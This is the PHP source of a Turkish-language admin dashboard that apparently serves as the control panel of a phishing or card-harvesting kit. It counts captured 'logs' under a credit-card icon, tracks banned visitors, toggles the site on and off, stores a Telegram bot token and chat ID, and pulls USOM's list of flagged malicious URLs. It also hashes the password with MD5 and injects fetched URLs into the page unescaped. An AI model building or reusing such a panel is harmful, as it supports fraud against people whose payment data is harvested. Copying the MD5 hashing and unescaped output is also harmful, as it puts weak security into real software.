<?php
session_start();

if (!isset($_SESSION['fast-admin']) || $_SESSION['fast-admin'] !== true) {
    header("Location: fast-login.php");
    exit;
}

require_once '../inc/brain.php';
date_default_timezone_set('Europe/Istanbul');
$saat = date('H:i:s');

try {
    $stmt = $pdo->query("SELECT COUNT(*) AS toplam FROM logs");
    $row = $stmt->fetch(PDO::FETCH_ASSOC);
    $toplam_log = $row['toplam'];
} catch (PDOException $e) {
    $toplam_log = "Hata";
}

try {
    $stmt = $pdo->query("SELECT COUNT(*) AS toplamban FROM banned");
    $row = $stmt->fetch(PDO::FETCH_ASSOC);
    $toplam_ban = $row['toplamban'];
} catch (PDOException $e) {
    $toplam_ban = "Hata";
}

try {
    if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["ajax"])) {
        $site_aktif = (int)$_POST["site_aktif"];
        $stmtUpdate = $pdo->prepare("UPDATE panel SET site_aktif = ? LIMIT 1");
        $stmtUpdate->execute([$site_aktif]);
        exit;
    }

    $stmtAktif = $pdo->query("SELECT site_aktif FROM panel LIMIT 1");
    $panelDurum = $stmtAktif->fetch();
    $site_aktif = $panelDurum ? (int)$panelDurum["site_aktif"] : 1;
} catch (PDOException $e) {
    $site_aktif = 1; 
}

try {
    $stmt = $pdo->query("SELECT * FROM yetkili LIMIT 1");
    $yetkili = $stmt->fetch();

    if ($yetkili) {
        $id                  = $yetkili['id'];
        $_SESSION['yetkili_id'] = $yetkili['id']; 
        $kullanici_adi       = $yetkili['yetkiliadi'];
        $parola_hash         = $yetkili['parola_hash'];
        $kisa_hash           = substr($parola_hash, 0, 4) . str_repeat('*', strlen($parola_hash) - 7) . substr($parola_hash, -3);
        $ip_adresi           = $yetkili['ip_adresi'];
        $son_giris_tarihi    = $yetkili['son_giris_tarihi'];
        $son_giris_ip        = $yetkili['son_giris_ip'];
        $son_giris_cihaz     = $yetkili['son_giris_cihaz'];
        $son_giris_tarayici  = $yetkili['son_giris_tarayici'];
    } else {
        echo "Yetkili kaydı bulunamadı.";
    }

    $stmtPanel = $pdo->query("SELECT t_token FROM panel LIMIT 1");
    $panel = $stmtPanel->fetch();

    if ($panel) {
        $t_token = $panel['t_token'];
    } else {
        $t_token = 'Token bulunamadı.';
    }

} catch (PDOException $e) {
    echo "Veritabanı hatası: " . $e->getMessage();
}
?>


<!DOCTYPE html><html lang="en" data-bs-theme="dark"><head>
	<meta charset="utf-8">
	<title>Marco | Dashboard</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="">
	<meta name="author" content="">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
	<link href="css/vendor.min.css" rel="stylesheet">
	<link href="css/app.min.css" rel="stylesheet">
	<link href="css/jquery-jvectormap.css" rel="stylesheet">
</head>

<body>
	<!-- BEGIN #app -->
	<div id="app" class="app">
		
		
		<?php
		include('../inc/fast-header.php');
		include('../inc/fast-sidebar.php');
		?>
			
		<!-- BEGIN mobile-sidebar-backdrop -->
		<button class="app-sidebar-mobile-backdrop" data-toggle-target=".app" data-toggle-class="app-sidebar-mobile-toggled"></button>
		<!-- END mobile-sidebar-backdrop -->
		
		<!-- BEGIN #content -->
		<div id="content" class="app-content">
			<!-- BEGIN row -->
			<div class="row">
				<!-- BEGIN col-3 -->
				<div class="col-xl-3 col-lg-6">
					<!-- BEGIN card -->
					<div class="card mb-3">
						<!-- BEGIN card-body -->
						<div class="card-body">
							<!-- BEGIN title -->
							<div class="d-flex fw-bold small mb-3">
									<span class="flex-grow-1">SİSTEM SAATİ</span>
								</div>
								<div class="row align-items-center mb-2">
									<div class="col-7">
										<h3 class="mb-0" id="systemClock"><?=$saat?></h3> </div>
									<div class="col-5">
										<div class="mt-n2" data-render="" data-type="bar" data-title="Visitors" data-height="30">
											<i class="fas fa-clock fa-3x float-end"></i>
										</div>
									</div>
								</div>

								<script>
									function updateSystemClock() {
										const now = new Date();
										const hours = String(now.getHours()).padStart(2, '0');
										const minutes = String(now.getMinutes()).padStart(2, '0');
										const seconds = String(now.getSeconds()).padStart(2, '0');
										document.getElementById('systemClock').innerText = `${hours}:${minutes}:${seconds}`;
									}

									setInterval(updateSystemClock, 1000);

									document.addEventListener('DOMContentLoaded', updateSystemClock);
								</script>

							<!-- END stat-lg -->
							<!-- BEGIN stat-sm -->
							<div class="small text-inverse text-opacity-50 text-truncate">
								<i class="fa fa-chevron-up fa-fw me-1"></i>Türkiye Saati<br>
							
							</div>
							<!-- END stat-sm -->
						</div>
						<!-- END card-body -->
						
						<!-- BEGIN card-arrow -->
						<div class="card-arrow">
							<div class="card-arrow-top-left"></div>
							<div class="card-arrow-top-right"></div>
							<div class="card-arrow-bottom-left"></div>
							<div class="card-arrow-bottom-right"></div>
						</div>
						<!-- END card-arrow -->
					</div>
					<!-- END card -->
				</div>
				<!-- END col-3 -->
				
				<!-- BEGIN col-3 -->
				<div class="col-xl-3 col-lg-6">
					<!-- BEGIN card -->
					<div class="card mb-3">
						<!-- BEGIN card-body -->
						<div class="card-body">
							<!-- BEGIN title -->
							<div class="d-flex fw-bold small mb-3">
								<span class="flex-grow-1">TOPLAM LOG</span>
							</div>
							<!-- END title -->
							<!-- BEGIN stat-lg -->
							<div class="row align-items-center mb-2">
								<div class="col-7">
									<h3 class="mb-0"><?=$toplam_log?></h3>
								</div>
								<div class="col-5">
									<div class="mt-n2" data-render="" data-type="bar" data-title="Visitors" data-height="30">
										<i class="fas fa-credit-card fa-3x float-end"></i>
									</div>
								</div>
							</div>
							<!-- END stat-lg -->
							<!-- BEGIN stat-sm -->
							<div class="small text-inverse text-opacity-50 text-truncate">
								<i class="fa fa-chevron-up fa-fw me-1"></i> Toplam Log Sayısı<br>
								
							</div>
							<!-- END stat-sm -->
						</div>
						<!-- END card-body -->
						
						<!-- BEGIN card-arrow -->
						<div class="card-arrow">
							<div class="card-arrow-top-left"></div>
							<div class="card-arrow-top-right"></div>
							<div class="card-arrow-bottom-left"></div>
							<div class="card-arrow-bottom-right"></div>
						</div>
						<!-- END card-arrow -->
					</div>
					<!-- END card -->
				</div>
				<!-- END col-3 -->
				
				<!-- BEGIN col-3 -->
				<div class="col-xl-3 col-lg-6">
					<!-- BEGIN card -->
					<div class="card mb-3">
						<!-- BEGIN card-body -->
						<div class="card-body">
							<!-- BEGIN title -->
							<div class="d-flex fw-bold small mb-3">
								<span class="flex-grow-1">TOPLAM YASAKLANAN</span>
								
							</div>
							<!-- END title -->
							<!-- BEGIN stat-lg -->
							<div class="row align-items-center mb-2">
								<div class="col-7">
									<h3 class="mb-0"><?=$toplam_ban?></h3>
								</div>
								<div class="col-5">
									<div class="mt-n2" data-render="" data-type="bar" data-title="Visitors" data-height="30">
										<i class="fas fa-ban fa-3x float-end"></i>
									</div>
								</div>
							</div>
							<!-- END stat-lg -->
							<!-- BEGIN stat-sm -->
							<div class="small text-inverse text-opacity-50 text-truncate">
								<i class="fa fa-chevron-up fa-fw me-1"></i> Toplam Yasaklanan Log<br>
								
							</div>
							<!-- END stat-sm -->
						</div>
						<!-- END card-body -->
						
						<!-- BEGIN card-arrow -->
						<div class="card-arrow">
							<div class="card-arrow-top-left"></div>
							<div class="card-arrow-top-right"></div>
							<div class="card-arrow-bottom-left"></div>
							<div class="card-arrow-bottom-right"></div>
						</div>
						<!-- END card-arrow -->
					</div>
					<!-- END card -->
				</div>
				<!-- END col-3 -->
				
				<!-- BEGIN col-3 -->
				<div class="col-xl-3 col-lg-6">
					<!-- BEGIN card -->
					<div class="card mb-3">
						<!-- BEGIN card-body -->
						<div class="card-body">
							<!-- BEGIN title -->
							<div class="d-flex fw-bold small mb-3">
								<span class="flex-grow-1">SİTE AÇ/KAPA</span>
							</div>
							<!-- END title -->

							<!-- BEGIN stat-lg -->
							<div class="row align-items-center mb-3">
								<div class="col-7 d-flex align-items-center">
									<div class="form-check form-switch">
										<input class="form-check-input" type="checkbox" id="siteToggle" <?= $site_aktif == 0 ? "checked" : "" ?>>
										<label class="form-check-label" for="siteToggle" id="siteToggleLabel">
											<?= $site_aktif == 0 ? "Siteyi Aç" : "Siteyi Kapat" ?>
										</label>
									</div>
								</div>
								<div class="col-5 text-end">
									<i class="fas fa-globe fa-3x"></i>
								</div>
							</div>

							
							<!-- END stat-lg -->
						</div>
						<!-- END card-body -->

						<!-- BEGIN card-arrow -->
						<div class="card-arrow">
							<div class="card-arrow-top-left"></div>
							<div class="card-arrow-top-right"></div>
							<div class="card-arrow-bottom-left"></div>
							<div class="card-arrow-bottom-right"></div>
						</div>
						<!-- END card-arrow -->
					</div>
					<!-- END card -->
				</div>

				<!-- END col-3 -->


			
	
			<div class="toast-container position-fixed" style="top: 1rem; right: 1rem; z-index: 9999;">
				<div id="siteToast" class="toast align-items-center text-white bg-success border-0" role="alert">
					<div class="d-flex">
					<div class="toast-body" id="toastMessage">İşlem başarılı.</div>
					<button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Kapat"></button>
					</div>
				</div>
			</div>


				
				
				
				
				<div class="col-xl-6">
					<div class="card mb-3">
					<div class="card-body">
						<div class="d-flex fw-bold small mb-3 align-items-center">
							<span class="flex-grow-1">USOM TARAMASI</span>
							
							<a href="#" data-toggle="card-expand" class="text-inverse text-opacity-50 text-decoration-none">
								<i class="bi bi-fullscreen"></i>
							</a>
						</div>
						<div class="table-responsive">
						<table class="table table-striped table-borderless mb-2px small text-nowrap">
							<tbody>
									<p>Güncel usom listesini görüntülüyorsunuz.</p>

							</tbody>
						</table>
						</div>
					</div>
					<div class="card-arrow">
						<div class="card-arrow-top-left"></div>
						<div class="card-arrow-top-right"></div>
						<div class="card-arrow-bottom-left"></div>
						<div class="card-arrow-bottom-right"></div>
					</div>
					</div>
				</div>

				<script>
					fetch('https://www.usom.gov.tr/url-list.txt')
					.then(response => response.text())
					.then(data => {
						const urls = data.trim().split('\n').slice(0, 10);
						const tableBody = document.querySelector('.table tbody');
						tableBody.innerHTML = ''; 
						urls.forEach(url => {
						const row = document.createElement('tr');
						row.innerHTML = `
							<td>
								<span class="d-flex align-items-center">
								<i class="bi bi-circle-fill fs-6px text-theme me-2"></i>
								${url}
								</span>
							</td>
							<td><small>az önce</small></td>
							<td>
								<span class="badge d-block bg-theme text-theme-900 rounded-0 pt-5px w-70px" style="min-height: 18px">USOM</span>
							</td>
							<td>
								<a href="http://${url}" target="_blank" rel="noopener noreferrer" class="text-decoration-none text-inverse">
								<i class="bi bi-search"></i>
								</a>
							</td>
							`;
						tableBody.appendChild(row);
						});
					})
					.catch(error => console.error('veriler usomdan alınamadı yönetici ile iletişime geçin :'));
				</script>

				<script>
				$(document).ready(function () {
					$('#siteToggle').on('change', function () {
						let aktifMi = $(this).is(':checked') ? 0 : 1;
						let labelText = aktifMi === 0 ? 'Siteyi Aç' : 'Siteyi Kapat';
						let toastText = aktifMi === 0 ? 'Site kapatıldı.' : 'Site açıldı.';

						$.post(window.location.href, {
							ajax: true,
							site_aktif: aktifMi
						}, function () {
							$('#siteToggleLabel').text(labelText);

							$('#toastMessage').text(toastText);

							$('#siteToast').removeClass('bg-success bg-danger')
										.addClass(aktifMi === 0 ? 'bg-danger' : 'bg-success');
							let toast = new bootstrap.Toast(document.getElementById('siteToast'));
							toast.show();
						}).fail(function () {
							alert("Sunucu hatası oluştu.");
							$('#siteToggle').prop('checked', !$(this).is(':checked'));
						});
					});
				});
				</script>


				<div class="col-xl-6">
					<div class="card position-relative mb-3">
						<div class="card-body">
							<div class="d-flex fw-bold small mb-3">
								<span class="flex-grow-1">PANEL ERİŞİMİ</span>
								<a href="#" data-toggle="card-expand" class="text-inverse text-opacity-50 text-decoration-none"><i class="bi bi-fullscreen"></i></a>
							</div>

							<div class="card-arrow">
							<div class="card-arrow-top-left"></div>
							<div class="card-arrow-top-right"></div>
							<div class="card-arrow-bottom-left"></div>
							<div class="card-arrow-bottom-right"></div>
							</div>


							<div class="table-responsive">
							    <table class="table table-striped table-borderless mb-2px small text-nowrap">
									<tbody>
										<p>Panel bilgilerinizi görüntüleyin veya düzenleyin.</p>
										<div class="card">
										   <div class="list-group list-group-flush">
												<div class="list-group-item d-flex align-items-center">
													<div class="flex-1 text-break">
													<div>Kullanıcı Adı</div>
													<div class="text-inverse text-opacity-50" id="yetkiliadi"><?=$kullanici_adi?></div>
													</div>
													<div>
													<a href="#editModal" 
														data-bs-toggle="modal" 
														data-field="yetkiliadi" 
														data-value="<?=$kullanici_adi?>"
														class="btn btn-outline-default edit-btn">Düzenle</a>
													</div>
												</div>

												<div class="list-group-item d-flex align-items-center">
													<div class="flex-1 text-break">
													<div>Parola</div>
													<small style="opacity:0.6;">MD5 şifreleme algoritması kullanılır.</small>
													<div class="text-inverse text-opacity-50" id="parola"><?=$kisa_hash?></div>
													</div>
													<div>
													<a href="#editModal" 
														data-bs-toggle="modal" 
														data-field="parola" 
														data-value=""
														class="btn btn-outline-default edit-btn">Düzenle</a>
													</div>
												</div>

												<div class="list-group-item d-flex align-items-center">
													<div class="flex-1 text-break">
													<div>Telegram Token</div>
													<div class="text-inverse text-opacity-50" id="t_token"><?=$t_token?></div>
													</div>
													<div>
													<a href="#editModal" 
														data-bs-toggle="modal" 
														data-field="t_token" 
														data-value="Token almak için -> @BotFather"
														class="btn btn-outline-default edit-btn">Düzenle</a>
													</div>
												</div>

												<div class="list-group-item d-flex align-items-center">
													<div class="flex-1 text-break">
													<div>Güncel Yetkili Verisi</div>
													<div class="text-inverse text-opacity-50" id="parola">Cihaz : <?=$son_giris_cihaz?></div>
													<div class="text-inverse text-opacity-50" id="parola">Tarayıcı : <?=$son_giris_tarayici?></div>
													</div>
												</div>

												<div class="list-group-item d-flex align-items-center">
													<div class="flex-1 text-break">
													<div>Son Giriş Bilgileri (IP & Tarih)</div>
													<div class="text-inverse text-opacity-50" id="parola"><?=$son_giris_ip?> | <?=$son_giris_tarihi?></div>
													</div>
												</div>
											</div>

											<div class="card-arrow">
												<div class="card-arrow-top-left"></div>
												<div class="card-arrow-top-right"></div>
												<div class="card-arrow-bottom-left"></div>
												<div class="card-arrow-bottom-right"></div>
												</div>

										</div>
								  </div>  </tbody>
							</table>       
						</div>
					</div>
			</div>

							<div class="toasts-container position-fixed top-0 end-0 p-3" style="z-index: 1060;">
							<div class="toast fade hide" id="updateToast" data-autohide="true" data-delay="3000">
								<div class="toast-header bg-dark text-white border-0">
								<i class="far fa-bell text-white me-2"></i>
								<strong class="me-auto">FrancisHit</strong>
								<small class="text-white-50">şimdi</small>
								<button type="button" class="btn-close btn-close-white ms-2 mb-1" data-bs-dismiss="toast" aria-label="Kapat"></button>
								</div>
								<div class="toast-body text-white bg-dark border-0 rounded-bottom">
								Güncelleme işlemi başarılı.
								</div>
							</div>
							</div>


							<div class="modal fade" id="editModal" tabindex="-1" aria-hidden="true">
								<div class="modal-dialog">
									<div class="modal-content">
									<div class="modal-header">
										<h5 class="modal-title" id="editModalTitle">Düzenle</h5>
										<button type="button" class="btn-close" data-bs-dismiss="modal"></button>
									</div>
									<div class="modal-body">
										<input type="text" id="editInput" class="form-control mb-2" />

										<div id="chatIdContainer" style="display: none;">
										<label for="chatInput" class="form-label">Telegram Chat ID</label>
										<input type="text" id="chatInput" class="form-control" placeholder="ChatID almak için -> @GetMyChatID_Bot" />
										</div>
										<input type="hidden" id="editField">
									</div>
									<div class="modal-footer">
										<button type="button" class="btn btn-outline-default" data-bs-dismiss="modal"><i class="fas fa-reply"></i> Kapat</button>
										<button type="button" class="btn btn-outline-theme" id="saveChangesBtn"><i class="fas fa-save"></i> Kaydet</button>
									</div>
									</div>
								</div>
							</div>

							<script>
							document.querySelectorAll('.edit-btn').forEach(button => {
								button.addEventListener('click', function () {
									const field = this.getAttribute('data-field');
									const value = this.getAttribute('data-value');

									const modalTitle = document.getElementById('editModalTitle');
									const input = document.getElementById('editInput');
									const fieldInput = document.getElementById('editField');
									const chatContainer = document.getElementById('chatIdContainer');
									const chatInput = document.getElementById('chatInput');

									modalTitle.textContent =
										field === 'yetkiliadi' ? 'Kullanıcı Adını Düzenle' :
										field === 'parola' ? 'Parolayı Düzenle' :
										field === 't_token' ? 'Telegram Token Düzenle' : 'Düzenle';

									input.type = field === 'parola' ? 'password' : 'text';
									input.value = value;
									fieldInput.value = field;

									if (field === 't_token') {
										chatContainer.style.display = 'block';
										chatInput.value = document.getElementById('chat_id')?.innerText.trim() || '';
									} else {
										chatContainer.style.display = 'none';
										chatInput.value = '';
									}
								});
							});


							document.getElementById('saveChangesBtn').addEventListener('click', function () {
							const field = document.getElementById('editField').value;
							const value = document.getElementById('editInput').value;
							const chatId = document.getElementById('chatInput').value;

							const formData = new URLSearchParams();
							formData.append('field', field);
							formData.append('value', value);

							if (field === 't_token') {
								formData.append('chat_id', chatId);
							}

							fetch('/inc/update-user.php', {
								method: 'POST',
								headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
								body: formData.toString()
							})
							.then(res => res.json())
							.then(data => {
								if (data.success) {
									const modalElement = document.getElementById('editModal');
									const modal = bootstrap.Modal.getInstance(modalElement);
									if (modal) modal.hide();

									setTimeout(() => {
										document.querySelectorAll('.modal-backdrop').forEach(el => el.remove());
										document.body.classList.remove('modal-open');
										document.body.style.overflow = '';
										document.body.style.paddingRight = '';
									}, 300);

									const toastEl = document.getElementById('updateToast');
									const toast = bootstrap.Toast.getOrCreateInstance(toastEl);
									toast.show();

									setTimeout(() => {
										location.reload();
									}, 1000); 
								} else {
									alert('Hata: ' + data.message);
								}
							})
						});
						</script>




						<!-- BEGIN card-arrow -->
						<div class="card-arrow">
							<div class="card-arrow-top-left"></div>
							<div class="card-arrow-top-right"></div>
							<div class="card-arrow-bottom-left"></div>
							<div class="card-arrow-bottom-right"></div>
						</div>
						<!-- END card-arrow -->
					</div>
					<!-- END card -->
				</div>
				<!-- END col-6 -->
			</div>
			<!-- END row -->
		</div>
		

		<a href="#" data-toggle="scroll-to-top" class="btn-scroll-top fade"><i class="fa fa-arrow-up"></i></a>
	</div>

	<script src="js/vendor.min.js" type="efade36a53868317824a3d21-text/javascript"></script>
	<script src="js/app.min.js" type="efade36a53868317824a3d21-text/javascript"></script>
	<script src="js/jquery-jvectormap.min.js" type="efade36a53868317824a3d21-text/javascript"></script>
	<script src="js/world-mill.js" type="efade36a53868317824a3d21-text/javascript"></script>
	<script src="js/apexcharts.min.js" type="efade36a53868317824a3d21-text/javascript"></script>
	<script src="js/dashboard.demo.js" type="efade36a53868317824a3d21-text/javascript"></script>
    <script src="js/rocket-loader.min.js" data-cf-settings="efade36a53868317824a3d21-|49" defer=""></script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>




</body></html>